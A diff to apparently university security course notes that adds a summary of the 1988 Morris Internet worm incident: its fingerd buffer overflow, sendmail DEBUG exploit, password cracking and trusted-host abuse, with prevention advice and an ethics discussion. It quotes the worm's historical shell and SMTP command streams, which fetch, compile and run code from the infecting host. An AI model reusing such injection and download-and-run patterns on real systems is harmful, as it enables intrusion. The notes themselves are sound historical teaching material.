@@ -120,6 +120,23 @@
       - [Stage 2](#stage-2)
       - [Stage 3](#stage-3)
       - [Moral](#moral)
+    - [MR3 - The Internet Worm Incident](#mr3---the-internet-worm-incident)
+      - [Introduction](#introduction)
+      - [Terminology](#terminology)
+        - [Worms](#worms)
+        - [Viruses](#viruses)
+        - [An Opposing View](#an-opposing-view)
+      - [How the Worm Operated](#how-the-worm-operated)
+        - [fingerd and gets](#fingerd-and-gets)
+        - [Sendmail](#sendmail)
+        - [Passwords](#passwords)
+        - [High Level Description](#high-level-description)
+        - [Step-by-step description](#step-by-step-description)
+      - [Chronology](#chronology)
+      - [Aftermath](#aftermath)
+        - [Author, Intent, and Punishment](#author-intent-and-punishment)
+        - [Worm Hunters](#worm-hunters)
+      - [Concluding Remarks](#concluding-remarks)
 
 ## Chapter 1
 
@@ -1354,7 +1371,7 @@ JtR can be also used to verify the quality of passwords used to protect pdf docu
 
 GPUs are execution architectures that often permit a relevant speedup in the execution of password cracking if compared with CPUs. The structure of the problem is quite good for parallelization and the modern GPUs often implement (in hardware) the main encryption ciphers. JtR has limited GPU support, and more appropriate tools are available for password cracking on GPU, for example Hashcat.
 
-## Mandatory Readings 
+## Mandatory Readings
 
 ### MR1 - The Internet of Things is wildly insecure and often unpatchable
 
@@ -1505,3 +1522,198 @@ The moral is obvious. You can't trust code that you did not totally create yours
 But let's moralize. We would like to criticize the press in its handling of the "hackers", the 414 gang, the Dalton gang, etc. The acts performed by these kids are vandalism at best and probably trespass and theft at worst. It is only the inadequacy of the criminal code that saves the hackers from very serious prosecution. The companies that are vulnerable to this activity, are pressing hard to update the criminal code.  
 There is an explosive situation brewing. On the one hand, the press, television and movies make heroes of vandals by calling them whiz kids. On the other hand, the acts performed by these kids will soon be punishable by years in prison.  
 The press must learn that misguided use of a computer is no more amazing than drunk driving of an automobile.
+
+### MR3 - The Internet Worm Incident
+
+On the evening of 2 November 1988, someone "infected" the Internet with a worm program. That program exploited flaws in utility programs in systems based on BSD_derived versions of UNIX. The flaws allowed the program to break into those machines and copy itself, thus infecting those systems. This program eventually spread to thousands of machines, and disrupted normal activities and Internet connectivity for many days.
+
+#### Introduction
+
+Worldwide, over 60'000 computers in interconnecting networks communicate using a common set of protocols, the Internet Protocols (IP). On the evening of 2 Nov '88 the Internet came under attack from within. Sometime after 5 PM EST, a program was executed on one or more of these hosts. That program collected host, network, and user information, then used that information to establish network connections and break into other machines using flaws present in those system's software. After breaking in, the program would replicate itself and the replica would attempt to infect other systems in the same manner. The program spread quickly.  
+The program was mysterious to users at sites where it appeared. Unusual files were left in the scratch (/usr/tmp) directories of some machines, and strange messages appeared in the log files of some of the utilities, such as the *sendmail* mail handling agent. The most noticeable effect, however, was that systems became more and more loaded with running processes as they become repeatedly infected. As time wen on, some of these machines became so loaded that they were unable to continue any processing; some machines failed completely when their swap space or process tables were exhausted.  
+By early, Nov 3, personnel at the University of California at Berkeley and MIT had "captured" copies of the program and began to analyze it. A common fear was that the program was somehow tampering with system resources in a way that could not be readily detected. By 5AM EST Nov 3, less than 12 hours after the program was first discovered on the network, the Computer Systems Research Group at Berkeley had developed an interim set of steps to halt its spread. This included a preliminary patch to the *sendmail* mail agent, and the suggestion to rename one or both of the C compiler and loader to prevent their use. These suggestions were published although their spread was hampered by systems disconnected from the Internet in an attempt to "quarantine" them.  
+By about 9 PM EST Nov 3, another simple, effective method of stopping the invading program, without altering system utilities, was discovered at Purdue and also widely published. Software patches were posted by the Berkeley group at the same time to mend all the flaws that enabled the program to invade systems. All that remained was to analyze the code that caused the problems and discover who had unleashed the worm, and why.
+
+#### Terminology
+
+Many people have used the term *worm* instead of *virus* based on its behaviour.  
+Worm:
+> A worm is a program that can run independently and can propagate a fully working version of itself to other machines. It is derived from the word tapeworm, a parasitic organism that lives inside a host and uses its resources to maintain itself.
+
+Virus:
+> A virus is a piece of code that adds itself to other programs, including OS. It cannot run independently - it requires that its "host" program be run to activate it. As such, it has an analog to biological viruses - those viruses are not considered alive in the usual sense; instead, they invade host cells and corrupt them, causing them to produce new viruses.
+
+##### Worms
+
+The concept of a worm was apparently first described by John Brunner in 1975. In 1979, researchers at Xerox PARC build and experimented with worm programs. The worms built at PARC were designed to travel from machine to machine and do useful work in a distributed environment.
+
+##### Viruses
+
+The first published use of the word virus to describe something that infects a computer was by David Gerrold in his science fiction short stories about the GOD machine. The term computer virus was first used in a formal way by Fred Cohen at USC. He defined the term to mean a security problem that attaches itself to other code and turns it into something that produces viruses; to quote from his paper:
+
+> "We define a computer 'virus' as a program that can infect other programs by modifying them to include a possibly evolved copy of itself."
+
+##### An Opposing View
+
+Eichin and Rochlis chose to call the Nov 2nd program a virus. Their reasoning for this required reference to biological literature and observing distinctions between lytic viruses and lysogenic viruses. It further requires that we view the Internet as a whole to be the infected host rather than each individual machine. Their explanation merely serves to underscore the dangers of co-opting terms from another discipline to describe phenomena within our own (computing).
+
+#### How the Worm Operated
+
+The Worm took advantage of flaws in standard software installed on many UNIX systems. It also took advantage of a mechanism used to simplify the sharing of resources in LAN.
+
+##### fingerd and gets
+
+The finger program is a utility that allows users to obtain information about other users. The fingerd program is intended to run as a daemon to service remote requests using the finger protocol. This daemon program accepts connections from remote programs, reads a single line of input, and then sends back output matching the received request.  
+The bug exploited to break fingerd involved overrunning the buffer the daemon used for input. The standard C language I/O library has a few routines that read input without checking for bounds on the buffer involved. In particular, the gets call takes input to a buffer without doing any bounds checking; this was the call exploited by the Worm.  
+The gets routine is not the only routine with this flaw. There is a whole family of routines in the C library that may also overrun buffers when decoding input or formatting output.  
+Although experienced C programmers are aware of the problems with these routines, many continue to use them. The hazard with these calls is that any network server or privileged program using them may possibly be compromised by careful precalculation of the (in)appropriate input.  
+Interestingly, at least two long-standing flaws based on this underlying problem have recently been discovered in other standard BSD UNIX commands.
+
+##### Sendmail
+
+The sendmail program is a mailer designed to route mail in a heterogeneous internetwork. The program operates in several modes, but the one exploited by the Worm involves the mailer operating as a daemon process. In this mode, the program is listening on a TCP port (25) for attempts to deliver mail using the standard Internet protocol SMTP.  
+The bug exploited in sendmail had to do with functionality provided by a debugging option in the code. The Worm would issue the DEBUG command to sendmail and then specify the recipient of the message as a set of commands instead of a user address. In normal operation, this is not allowed, but it is present in the debugging code to allow testers to verify that mail is arriving at a particular site without the need to invoke the address resolution routines.  
+THe sendmail program is of immense importance on most Berkeley-derived (and other) UNIX systems because it handles the complex tasks of mail routing and delivery. Yet, despite its importance and widespread use, most system administrators know little about how it works.  
+It is little wonder, then, that bugs are present in sendmail that allow unexpected behaviour. Other flaws have been found and reported now that attention has been focused on the program, but it is not known for sure if all the bugs have been discovered and all the patched circulated.
+
+##### Passwords
+
+A key attack of the Worm program involved attempts to discover user passwords. It was able to determine success because the encrypted password of each user was in a publicly-readable file. In UNIX systems, the user provides a password at sign-on to verify identity. The password is encrypted using a permuted version of the DES algorithm, and the result is compared against a previously encrypted version present in a world-readable accounting file. If a match occurs, access is allowed.  
+The organization of the passwords in UNIX allows non-privileged commands to make use of information stored in the accounts file, including authentication schemes using user passwords. However, it also allows an attacker to encrypt lists of possible passwords and then compare them against the actual password without calling any system function. The Worm used such an attack to break passwords. It used lists of words, including the standard online dictionary, as potential password. It encrypted them using a fast version of the password algorithm and then compared the result against the contents of the system file. The Worm exploited the accessibility of the file coupled with the tendency of users to choose common words as their passwords. Some sites reported that over 50% of their passwords were quickly broken by this simple approach.  
+One way to reduce the risk of such attacks is to have a shadow password file. The encrypted passwords are saved in a file that is readable only by the system administrators, and a privileged call performs password encryptions and comparisons with an appropriate timed delay. This would prevent any attempt to "fish" for passwords. Additionally, a threshold could be included to check for repeated password attempts from the same process, resulting in some form of alarm being raised. Shadow password files should be used in combination with encryption rather than in place of such techniques.  
+Another way to strengthen the password mechanism would be to change the utility that sets user passwords. The utility currently makes minimal attempt to ensure that new passwords are nontrivial to guess. The program could be strengthened in such a way that it would reject any choice of a word currently in the on-line dictionary or based on the account name.  
+A related flaw exploited by the Worm involved the use of trusted logins. One useful features of BSD UNIX-based networking code is its support for executing tasks on remote machines. It is possible for a user to specify a list of host/login name pairs that are assumed to be trusted. This feature has often been responsible for users gaining unauthorized access to machines but it continues to be used because of its great convenience.  
+The Worm exploited the mechanism by trying to locate machine that might trust the current machine/login being used by the Worm. This was done by examining files that listed remote machine/logins trusted by the current host. One the Worm found such likely candidates, it would attempt to instantiate itself on those machine by using the remote execution facility.  
+To defeat future such attempts requires that the current remote access mechanism be removed and replaced with something else, like Kerberos.
+
+##### High Level Description
+
+The Worm consisted of two parts: a main program, and a bootstrap or vector program. The main program, one established on a machine, would collect information on other machines in the network to which the current machine could connect. It would then attempt to use the flaws described above to establish its bootstrap on each of those remote machines.  
+The bootstrap was 99 lines of C code that would be compiled and run on the remote machine. The source for this program would be transferred to the victim machine. It would then be compiled and invoked on the victim machine with three command line arguments: the network address of the infecting machine, the number of the network port to connect to on that machine to get copies of the main Worm files, and a magic number that effectively acted as a one-time-challenge password. If the "server" Worm on the remote host and port did not receive tha same magic number back before starting the transfer, it would immediately disconnect from the vector program. This may have been done to prevent someone from attempting to "capture" the binary files by spoofing a Worm "server".  
+This code also wen to some effort to hide itself, both by zeroing out its argument vector and by immediately forking a copy of itself. If a failure occurred in transferring a file, the code deleted all files it had already transferred, then it exited.  
+One established on the target machine, the bootstrap would connect back to the instance of the Worm that originated it and transfer a set of binary files to the local machine. The bootstrap would also transfer a copy of itself for use in infecting other systems. The program had data structures allocated to enable transfer of up to 20 files; it was used with only three. This has led to speculation whether a more extensive version of the Worm was planned for a later date, and if that version might have carried with it other command files, passwords data, or possibly local virus or trojan horse programs.  
+Once the binary files were transferred, the bootstrap program would load and link these files with the local versions of the standard libraries. One after another, these programs were invoked. If one of them ran successfully, it read into its memory copies of the bootstrap and binary files and then deleted the copies on disk. It would then attempt to break into other machines. If none of the linked versions ran, then the mechanism running the bootstrap would delete all the disk files created during the attempted infection.
+
+##### Step-by-step description
+
+ This description starts from the point at which a host is about to be infected. A Worm running on another machine has either succeeded in establishing a shell on the new host and has connected back to the infecting machine via a TCP connection, or it has connected to the SMTP port and is transmitting to the sendmail program.  
+ The infection proceeded as follows:
+
+1. A socket was established on the infecting machine for the vector program to connect. A challenge string was constructed from a random number. A file name base was also constructed using a random number.
+2. The vector program was installed and executed using one of two methods:
+    1. Across a TCP connection to a shell, the Worm would send the commands below. Then it would wait for the string "DONE" to signal that the vector program was running.  
+  
+    ```sh
+    PATH=/bin:/usr/bin:/usr/ucb
+    cd usr/tmp
+    echo gorch49; sed 'lint zz/q' > x14481910.c;echo gorch50
+    [text of vector program]
+    int ZZi
+    CC -0 x14481910 x14481910.c;./x14481910 128.32.134.16 32341 87124!
+    rm -f x14481910 x14481910.C;echo DONE
+    ```
+
+    2. Using the SMTP connection, it would transmit the commands:
+
+    ```sh
+    debug
+    mail from: </dev/null>
+    rcpt to: <"Ised -e 'l,/^$/'d I /bin/sh ; exit 0">
+    data
+    cd /usr/tmp
+    cat > x14481910.c << 'EOF'
+    [text of vector program]
+    EOF
+    cc -0 x14481910 x14481910.c;x14481910 128.32.134.16 32341 8712440;
+    rm -f x14481910 x14481910.c
+    quit
+    ```
+
+    The infecting Worm would then wait for up to 2 minutes on the designated port for the vector to contact it.
+3. The vector program then connected to the "server", sent the challenge string, and transferred three files: a Sun 3 binary version of the Worm, a VAX version, and the source code for the vector program. After the files were copied, the running vector program became (via te execl call) a shell with its input and output still connected to the server Worm.
+4. The server Worm sent a command stream to the connected shell:
+
+    ```sh
+    PATH=/bin:/usr/bin:/usr/ucb
+    rm -f sh
+    if [ -f sh ]
+    then
+    P=x14481910
+    else
+    P=sh
+    fi
+    ```
+
+    Then, for each binary file it had transferred, it would send a command sequence:
+  
+    ```sh
+    cc -0 $P x14481910,sun3.o
+    ./$P -p $$ x14481910,sun3.o x14481910,vax.o x14481910,11.c
+    rm -f $P
+    ```
+
+    The rm would succeed only if the linked version of the Worm failed to start execution. If the server determined that the host was now infected, it close the connection. Otherwise, it would try the other binary file. After both binary files had been tried, it would send over rm commands for the object files to clear away all evidence of the attempt at infection.
+5. The new Worm on the infected host proceeded to "hide" itself by obscuring its argument vector, unlinking the binary version of itself, and killing its parent. It then read into memory each of the Worm binary files, encrypted each file after reading it, and deleted the files from disk.
+6. Next, the new Worm gathered information about network interfaces and hosts to which the local machine was connected. It gathered some of this information by making direct ioctl calls and by running the netstat program with various arguments. It also read through various system files looking for host names to add to its database.
+7. It randomized the lists of hosts it constructed, then attempted to infect some of them. For directly connected networks, it created a list of possible host numbers and attempted to infect those hosts if they existed.
+8. The infection attempts proceeded by one of three routes:
+   - *rsh*: the attack via rsh was done by attempting to spawn a remote shell by invocation of /usr/ucb/rsh, /usr/bin/rsh, and /bin/rsh. If successful, the host was infected as in steps 1 and 2.1 above.
+   - *fingerd*: the attack via finger daemon was somewhat more subtle. A connection was established to the remote finger server daemon and then a specially constructed string of 536 bytes was passed to the daemon, overflowing its 512 byte input buffer and overwriting parts of the stack. For standard 4 BSD versions running on VAX computers, the overflow resulted in the return stack frame for the main routine being changed so that the return address pointed into the buffer on the stack. After the instructions were written into the stack, the code executed when the main routine attempted to return was `execve("/bin/sh",0,0)`. On VAXen, this resulted in the Worm connected to a remote shell via the TCP connection. The Worm then proceeded to infect the host as in steps 1 and 2.1 above.
+   - *sendmail*: The Worm then tried to infect the remote host by establishing a connection to the SMTP port and mailing an infection, as in step 2.2 above.
+  
+    Not all the steps were attempted. As soon as one method succeeded, the host entry in the internal list was marked as infected and the other methods were not attempted.
+9. Next, it entered a state machine consisting of five states. Each state but the last was run for a short while, then the program looped back to step 7. The first four of the five states were attempts to break into user accounts on the local machine. In the fifth state (the final state), the Worm looped forever trying to infect hosts in its internal tables and marked as not yet infected. The first four states were:
+   1. The Worm read through the /etch/hosts.equiv files and /.rhosts files to find the names of equivalent hosts. Next, the Worm read /etc/passwd and it also examined the .forward file in each user home directory and included any new host names into its internal table of hosts to try.
+   2. The Worm attempted to break each user password using simple choices.
+   3. The third stage in the process involved trying to break the password of each user by trying each word present in an internal dictionary of words. This dictionary of 432 words was tried against each account in a random order.
+   4. The fourth stage was entered if all other attempts failed. For each word in the online dictionary, the Worm would see if it was the password to any account. In addition, if the word in the dictionary began with an upper case letter, the letter was converted to lowercase and that word was also tried against all the passwords.
+10. Once a password was broken for any account, the Worm would attempt to break into remote machines where that used had accounts. The Worm would scan the .forward and .rhosts files of the user at this point, and identify the names of remote hosts that had accounts used by the target user. It then attempted two attacks:
+    1. The Worm would first attempt to create a remote shell using the rexec service. The attempt would be made using the account name given in the .forward or .rhosts file and the user's local password.
+    2. The Worm would do a rexec to the current host and would try a rsh command to the remote host using the username taken from the file.
+  If the remote shell was created either way, the attack would continue as in steps 1 and 2.1, above. No other use was made of the user password.
+
+Throughout the execution of the main loop, the Worm would check for other Worms running on the same machine. To do this, the Worm would attempt to connect to another Worm on a local, predetermined TCP socket. If such a connection succeeded, one Worm would (randomly) set an internal variable named *pleasequit* to 1, causing that Worm to exit after it had reached part way into the third stage (9.3) of password cracking. This delay is part of the reason many systems had multiple Worms running.  
+One out of every seven Worms would become "immortal" rather than check for other local Worms. Based on a generated random number they would set an internal flag that would prevent them from ever looking for another Worm on their host. This may have been done to defeat any attempt to put a fake Worm process on the TCP port to kill existing Worms.  
+
+The Worm attempted to send a UDP packet to the host ernie.berkeley.edu approximately once every 15 infections. The code to do this was incorrect, however, and no information was ever sent. However, the code is such that an uninitialized byte is the intended message. It is possible that the author eventually intended to run some monitoring program on ernie.
+
+The Worm would also fork itself on a regular basis and kill its parent. This has two effects:
+
+- First, the Worm appeared to keep changing its process identifier and no single process accumulated excessive amount of cpu time.
+- Secondly, processes that have been running for a long time have their priority downgraded by the scheduler. By forking, the new process would regain normal scheduling priority. This mechanism did not always work correctly, either, as locally we observed some instances of the Worm with over 600 seconds of accumulated cpu time.  
+- If the Worm was present on a machine for more than 12 hours, it would flush its host list of all entries flagged as being immune or already infected. The way hosts were added to this list implies that a single Worm might reinfect the same machines every 12 hours.
+
+#### Chronology
+
+The chronology is not reported in the summary, but it is particularly interesting to note how quickly and how widely the Worm spread. It is also significant to note how quickly it was identified and stopped by an ad hoc collection of "Worm hunters" using the same network to communicate their results.
+
+#### Aftermath
+
+In the weeks and month following the release of the Internet Worm, there have been a few topics hotly debated in mailing lists, media coverage, and personal conversations. A few of these are particularly significant and they will be presented here.
+
+##### Author, Intent, and Punishment
+
+The question of "Who?" was answered shortly thereafter when the New York Times identified Robert T. Morris. Although he has not publicly admitted authorship, and no court of law has yet pronounced guilt (as of the year was written), there seems to be a large body of evidence to support such an identification.  
+Thus, the identity of the author appears well established, but his motive remains a mystery. Conjectures have ranged from an experiment gone away to a subconscious act of revenge against his father. All of this is sheer speculation, however, since no statement has been forthcoming from Mr. Morris. All we have to work with is the decompiled code for the program and our understanding of its effects.  
+Two things have been noted by many people who have read the decompiled code, 
+however:
+
+1. The Worm program contained no code that would explicitly cause damage to any system on which it ran. Considering the ability and knowledge evidenced by the code, it would have been a simple matter for the author to have included such commands if that was his intent. Unless the Worm was released prematurely, it appears that the author's intent did not involve explicit, immediate destruction or damage of any data or systems.
+2. A second feature of note was that the code had no mechanism to halt the spread of the Worm. Once started, the Worm would propagate while also taking steps to avoid identification and capture. Due to this and the complex argument string necessary to start it, individuals who have examined the code believe it unlikely that the Worm was started by accident or was intended not to propagate widely.
+
+In light of our lack of definitive information, it is puzzling to note attempts to defend Mr. Morris by claiming that his intent was to demonstrate something about Internet security, or that he was trying a harmless experiment.  
+The Provost's report from Cornell, however, does not attempt to excuse Mr. Morris's behaviour. It quite clearly labels the actions as unethical and contrary to the standards of the computer profession. They very clearly state that his actions were against university policy and accepted practice, and that based on his past experience he should have known it was wrong to act as he did.
+
+##### Worm Hunters
+
+On Nov 29, someone exploiting a security flaw present in older versions of the FTP file transfer program broke into a machine on the MILnet. This event, coming as close as it did to the Worm incident, prompted DARPA to establish the CERT - the Computer Emergency Response Team - at the Software Engineering Institute at Carnegie-Mellon University. The purpose of the CERT is to act as a central switchboard and coordinator for computer security emergencies on Arpanet and MILnet computers. The Center has asked for volunteers from Federal agencies and funded laboratories to serve as technical advisors when needed.
+
+#### Concluding Remarks
+
+It is important to note that the nature of both the Internet and UNIX helped to defeat the Worm as well as spread it.
+
+What we learn from this about securing our systems will help determine if this is the only such incident we ever need to analyze. This attack should also point out that we need a better mechanism in place to coordinate information about security flaws and attacks. The response to this incident was largely ad hoc, and resulted in both duplication of effort and a failure to disseminate valuable information to sites that needed it. The major sources of information for many of the sites affected seems to have been Usenet news groups and a mailing list the author put together when the Worm was first discovered. Although useful, these methods did not ensure timely, widespread dissemination of useful information - especially since many of them depended on the Internet to work!  
+The Worm has shown us that we are all affected by events in our shared environment, and we need to develop better information methods outside the network before the next crisis. The formation of the CERT may be a step in the right direction, but a more generale solution is still needed.
+
+Finally, this whole episode should cause us to think about the ethics and laws concerning access to computers. Since the technology we use has developed so quickly, it is not always simple to determine where the proper boundaries of moral action may be.  
+Entire businesses are noe dependent, wisely or not, on computer systems. People's money, careers, and possibly even their lives may be dependent on the undisturbed functioning of computers. As a society, we cannot afford the consequences of condoning or encouraging reckless or ill-considered behaviour that threatens or damages computer systems, especially by individuals who do not understand the consequences of their actions. As professionals, computer scientists and computer engineers cannot afford to tolerate the romanticization of computer vandals and computer criminals, and we must take the lead by setting proper examples. Let us hope there are not further incidents to underscore this particular lesson.
